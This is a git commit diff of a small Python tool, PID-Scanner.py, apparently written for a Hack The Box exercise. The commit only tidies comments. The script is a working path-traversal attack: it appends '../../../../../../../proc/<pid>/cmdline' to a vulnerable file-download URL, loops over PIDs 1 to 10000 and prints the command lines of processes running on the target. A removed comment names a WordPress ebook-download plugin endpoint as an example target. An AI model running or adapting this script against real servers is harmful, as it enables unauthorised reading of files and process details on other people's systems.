1ed76beadcfd7a3f60c37ca6f29a53bec3716f41
Lucky | Robin <58462797+Robing00@users.noreply.github.com>
2022-04-21 16:47:40 +0200

    few changes to comments

--- PID-Scanner.py
+++ PID-Scanner.py
@@ -1,25 +1,22 @@
-#Import requests to use GET and import re for RegEx
+# Import requests to use GET and import re for RegEx
 import requests
 import re
 
-#CHANGE THIS###################################################
+### CHANGE THIS ###
 url="http://vulnerable.website.com"
-#EXAMPLE FORM HTB BACKDOOR (ebook vulnerability):
-#url="http://IP-ADDRESS/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl="
 
-#see that the program started
+# see that the program started
 print("searching:")
 
-#for loop trough 1-10000 to look for IDs in this range
+# for loop trough 1-10000 to look for IDs in this range
 for i in range(1, 10000):
-  #CHANGE THIS (tar_url) TO YOUR URL
   tar_url= url + "../../../../../../../proc/"+ str(i) +"/cmdline"
-  #Makes the GET-Request and saves the content + length
+  # Makes the GET-Request and saves the content + length
   r = requests.get(tar_url)
   length_content = len(r.content)
   content = r.content
 
-  #Prints out the important stuff 
+  # Prints out the important stuff 
   if(length_content > 150):
     print("-----------------------------------------------------------------------------")
     print("process found with length: " + str(length_content))
@@ -27,4 +24,4 @@ for i in range(1, 10000):
     print("Result:", re.split("/cmdline/" , str(content)))
     print("-----------------------------------------------------------------------------\n")
     
-#HF Looking fot the Process :>
+# HF Looking for the Process :>
